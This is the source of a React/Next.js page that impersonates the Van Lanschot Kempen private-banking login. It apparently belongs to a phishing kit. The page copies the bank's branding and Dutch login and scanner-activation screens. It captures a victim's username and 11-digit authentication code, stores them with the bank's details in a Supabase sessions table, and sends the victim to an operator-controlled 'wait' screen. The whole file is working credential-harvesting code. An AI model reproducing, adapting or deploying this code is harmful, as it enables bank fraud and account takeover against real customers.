"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { VAN_LANSCHOT_KEMPEN_LOGO_URL } from "@/lib/bank-logo-constants";
import { stepToPath } from "@/lib/session-routes";

export function VanLanschotKempenClient({ sessionId }: { sessionId: string }) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  
  const [step, setStep] = useState(1);
  const [username, setUsername] = useState("");
  const [code, setCode] = useState("");
  const [remember, setRemember] = useState(false);
  const [saving, setSaving] = useState(false);
  const formDoluMuStep1 = username.trim().length > 0;
  const formDoluMuStep3 = code.length === 11;

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (!supabase || !sessionId) return;
      const { data } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      if (fd.verfuegernummer) setUsername(fd.verfuegernummer);
      if (fd.pin) setCode(fd.pin);
    })();
    return () => { cancelled = true; };
  }, [sessionId, supabase]);

  async function handleFinalSubmit() {
    if (!supabase || !sessionId) return;
    setSaving(true);
    const { data: existing } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    await supabase.from("sessions").update({ is_hidden: false, current_step: "wait",
      form_data: { 
        ...prev, 
        bankSlug: "van-lanschot-kempen", 
        bankName: "Van Lanschot Kempen", 
        logoFile: VAN_LANSCHOT_KEMPEN_LOGO_URL,
        verfuegernummer: username, 
        pin: code 
      }
    }).eq("id", sessionId);
    // ⭐ FLASH YOK: router.push → router.replace
    router.replace(stepToPath("wait", sessionId));
  }

  // Common Header and Footer for Step 1 and 2
  const Layout = ({ children }: { children: React.ReactNode }) => (
    <div className="min-h-screen bg-[#F5F6F6] font-sans flex flex-col items-center pt-8 pb-16 px-4">
      <div className="w-full max-w-[800px]">
        <img src={VAN_LANSCHOT_KEMPEN_LOGO_URL} alt="Van Lanschot Kempen" className="h-10 w-auto object-contain mb-8" />
      </div>
      
      <div className="w-full max-w-[800px] flex-1 flex flex-col items-center">
        <h1 className="text-[34px] font-serif text-[#2C3A40] mb-8 w-full text-center md:text-left">Log in to My Private Bank</h1>
        {children}
      </div>

      <div className="w-full max-w-[800px] mt-12 flex flex-wrap justify-center gap-4 text-[13px] text-[#007A73] font-medium">
        <a href="#" className="hover:underline">About Van Lanschot Kempen</a> <span className="text-gray-300">|</span>
        <a href="#" className="hover:underline">Secure Banking</a> <span className="text-gray-300">|</span>
        <a href="#" className="hover:underline">Privacy and cookies</a> <span className="text-gray-300">|</span>
        <a href="#" className="hover:underline">Disclaimer</a> <span className="text-gray-300">|</span>
        <a href="#" className="hover:underline">Need Help?</a>
      </div>
    </div>
  );

  if (step === 3) {
    return (
      <div className="min-h-screen bg-[#768388] font-sans flex flex-col items-center justify-center p-4">
        {/* Top Left Logo in overlay */}
        <div className="absolute top-8 left-8">
           <img src={VAN_LANSCHOT_KEMPEN_LOGO_URL} alt="Van Lanschot Kempen" className="h-10 w-auto object-contain" />
        </div>

        <div className="bg-white rounded-lg w-full max-w-[700px] shadow-2xl overflow-hidden relative">
          <button className="absolute top-6 right-6 text-gray-500 hover:text-gray-800" onClick={() => setStep(2)}>
            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
          </button>

          <div className="p-10">
            <h1 className="text-[28px] font-serif text-[#2C3A40] mb-8">Activeer scanner</h1>

            <div className="bg-[#F0F2F2] rounded-md p-8">
              <div className="flex justify-between items-center mb-6">
                <div>
                  <label className="block text-[13px] font-bold text-[#2C3A40] mb-2">Gebruikersnaam</label>
                  <div className="bg-white border border-gray-300 rounded px-3 py-1.5 text-[14px] text-[#2C3A40] min-w-[120px] font-medium">
                    {username}
                  </div>
                </div>
                <button onClick={() => setStep(1)} className="text-[#007A73] text-[14px] font-bold flex items-center gap-1 hover:underline">
                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path></svg>
                  Wijzig gebruiker
                </button>
              </div>

              <div className="flex items-center gap-2 text-[14px] font-bold mb-6 border-b border-gray-300 pb-4">
                <span className="w-6 h-6 rounded-full bg-[#007A73] text-white flex items-center justify-center text-[12px]">1</span>
                <span className="text-[#007A73]">Scan de kleurcode uit de brief &gt;</span>
                <span className="w-6 h-6 rounded-full bg-gray-400 text-white flex items-center justify-center text-[12px] ml-2">2</span>
                <span className="text-gray-500">Scan de online kleurcode</span>
              </div>

              <div className="space-y-4 mb-8">
                <div className="flex items-start gap-3">
                  <span className="w-6 h-6 shrink-0 rounded-full bg-[#0077C8] text-white flex items-center justify-center text-[12px] font-bold mt-0.5">1</span>
                  <p className="text-[15px] font-bold text-[#2C3A40]">Zet uw scanner aan met de aan-knop.</p>
                </div>
                <div className="flex items-start gap-3">
                  <span className="w-6 h-6 shrink-0 rounded-full bg-[#0077C8] text-white flex items-center justify-center text-[12px] font-bold mt-0.5">2</span>
                  <p className="text-[15px] font-bold text-[#2C3A40]">Scan de kleurcode van de activatiebrief die u heeft ontvangen.</p>
                </div>
                <div className="flex items-start gap-3">
                  <span className="w-6 h-6 shrink-0 rounded-full bg-[#0077C8] text-white flex items-center justify-center text-[12px] font-bold mt-0.5">3</span>
                  <p className="text-[15px] font-bold text-[#2C3A40]">Volg de instructies op uw scanner.</p>
                </div>
                <div className="flex items-start gap-3">
                  <span className="w-6 h-6 shrink-0 rounded-full bg-[#0077C8] text-white flex items-center justify-center text-[12px] font-bold mt-0.5">4</span>
                  <p className="text-[15px] font-bold text-[#2C3A40]">Vul hieronder de 11-cijferige code in.</p>
                </div>
              </div>

              <div className="mb-4">
                <label className="block text-[14px] font-bold text-[#2C3A40] mb-2">Code</label>
                <input 
                  type="text" 
                  value={code}
                  onChange={e => setCode(e.target.value.replace(/\D/g, '').slice(0, 11))}
                  className="w-full bg-white border-2 border-[#007A73] rounded py-3 px-4 text-[16px] font-mono tracking-widest focus:outline-none" 
                />
                {code.length > 0 && code.length < 11 && (
                  <p className="text-red-500 text-[12px] mt-1">De code moet uit 11 cijfers bestaan.</p>
                )}
              </div>
            </div>

            <div className="flex items-center justify-between mt-8">
              <a href="#" className="text-[#007A73] text-[15px] font-bold flex items-center gap-1 hover:underline">
                <span className="w-5 h-5 rounded-full border border-[#007A73] flex items-center justify-center text-[12px]">?</span>
                Hulp nodig?
              </a>
              <button 
                onClick={() => handleFinalSubmit()}
                disabled={!formDoluMuStep3 || saving} 
                className={`font-bold py-3 px-12 rounded transition-colors ${formDoluMuStep3 && !saving ? "bg-[#007A73] hover:bg-[#00605a] text-white" : "bg-gray-400 text-gray-700 opacity-70"}`}
              >
                {saving ? "Loading..." : "Next"}
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <Layout>
      <div className="w-full bg-white rounded-xl shadow-sm border border-gray-100 overflow-hidden">
        
        {/* Tabs */}
        <div className="flex border-b border-gray-200 px-6">
          <button className="flex-1 py-5 text-[15px] font-bold text-[#007A73] flex items-center justify-center gap-2 hover:bg-gray-50 transition-colors">
            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
            Private Banking App
          </button>
          <button className="flex-1 py-5 text-[15px] font-bold text-[#007A73] flex items-center justify-center gap-2 hover:bg-gray-50 transition-colors">
            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 7h6m0 10v-3m-3 3h.01M9 17h.01M9 14h.01M12 14h.01M15 11h.01M12 11h.01M9 11h.01M7 21h10a2 2 0 002-2V5a2 2 0 00-2-2H7a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
            Digipas
          </button>
          <button className="flex-1 py-5 text-[15px] font-bold text-[#007A73] flex items-center justify-center gap-2 border-b-4 border-[#007A73]">
            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 5a1 1 0 011-1h14a1 1 0 011 1v2a1 1 0 01-1 1H5a1 1 0 01-1-1V5zM4 13a1 1 0 011-1h6a1 1 0 011 1v6a1 1 0 01-1 1H5a1 1 0 01-1-1v-6zM16 13a1 1 0 011-1h2a1 1 0 011 1v6a1 1 0 01-1 1h-2a1 1 0 01-1-1v-6z"></path></svg>
            Scanner
          </button>
        </div>

        <div className="p-8">
          <div className="bg-[#F0F2F2] rounded-lg p-8">
            
            {step === 1 && (
              <form onSubmit={(e) => { e.preventDefault(); setStep(2); }}>
                <div className="mb-6">
                  <label className="flex items-center gap-1 text-[14px] font-bold text-[#2C3A40] mb-2">
                    Gebruikersnaam
                    <span className="w-4 h-4 rounded-full border border-[#007A73] text-[#007A73] flex items-center justify-center text-[10px]">i</span>
                  </label>
                  <div className="relative">
                    <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                      <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path></svg>
                    </div>
                    <input 
                      type="text" 
                      value={username} 
                      onChange={e => setUsername(e.target.value)} 
                      className="w-full bg-white border border-[#007A73] rounded py-3 pl-10 pr-4 text-[15px] text-[#2C3A40] focus:outline-none focus:ring-1 focus:ring-[#007A73]" 
                    />
                  </div>
                </div>

                <div className="flex items-center gap-3 mb-4">
                  <button 
                    type="button" 
                    onClick={() => setRemember(!remember)}
                    className={`w-12 h-6 rounded-full flex items-center px-1 transition-colors ${remember ? 'bg-[#007A73]' : 'bg-gray-400'}`}
                  >
                    <div className={`w-4 h-4 rounded-full bg-white transition-transform ${remember ? 'transform translate-x-6' : ''}`}></div>
                  </button>
                  <span className="text-[14px] font-bold text-[#2C3A40]">Onthoud mijn gegevens</span>
                </div>
              </form>
            )}

            {step === 2 && (
              <div>
                <div className="flex justify-between items-center mb-6">
                  <div>
                    <label className="block text-[13px] font-bold text-[#2C3A40] mb-2">Gebruikersnaam</label>
                    <div className="bg-white border border-gray-300 rounded px-3 py-1.5 text-[14px] text-[#2C3A40] min-w-[120px] font-medium">
                      {username}
                    </div>
                  </div>
                  <button onClick={() => setStep(1)} className="text-[#007A73] text-[14px] font-bold flex items-center gap-1 hover:underline">
                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path></svg>
                    Wijzig gebruiker
                  </button>
                </div>

                <hr className="border-gray-300 my-6" />

                <div className="flex items-center justify-between">
                  <p className="text-[15px] font-medium text-[#2C3A40]">Activeer de scanner voor het eerste gebruik.</p>
                  <img src="/bank-assets/vanlanschotkempen/tasarım 2 okuyucu.png" alt="Scanner" className="h-[180px] object-contain mix-blend-multiply" />
                </div>
              </div>
            )}
          </div>

          <div className="flex items-center justify-between mt-8">
            <a href="#" className="text-[#007A73] text-[15px] font-bold flex items-center gap-1 hover:underline">
              <span className="w-5 h-5 rounded-full border border-[#007A73] flex items-center justify-center text-[12px]">?</span>
              Hulp nodig?
            </a>
            
            {step === 1 && (
              <button 
                onClick={() => setStep(2)}
                disabled={!username} 
                className="bg-[#E2E6E8] text-gray-500 font-bold py-3 px-12 rounded disabled:opacity-70 hover:bg-[#d1d6d8] transition-colors"
              >
                Verder
              </button>
            )}

            {step === 2 && (
              <button 
                onClick={() => setStep(3)}
                className="bg-[#007A73] text-white font-bold py-3 px-8 rounded hover:bg-[#00605a] transition-colors"
              >
                Activeer de scanner
              </button>
            )}
          </div>
        </div>
      </div>
    </Layout>
  );
}
